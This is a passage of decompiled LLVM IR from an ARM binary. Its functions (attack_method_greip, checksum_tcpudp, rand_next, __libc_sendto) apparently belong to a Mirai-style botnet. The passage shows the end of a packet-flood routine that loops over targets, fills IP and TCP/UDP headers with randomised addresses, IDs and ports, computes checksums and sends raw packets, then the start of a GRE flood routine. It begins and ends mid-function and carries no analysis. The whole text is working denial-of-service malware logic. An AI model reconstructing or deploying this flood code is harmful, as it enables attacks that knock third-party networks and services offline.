  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, 65280
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v5_997c = call i32 @llvm.bswap.i32(i32 %v0_9960)
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 1, 2, 0, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
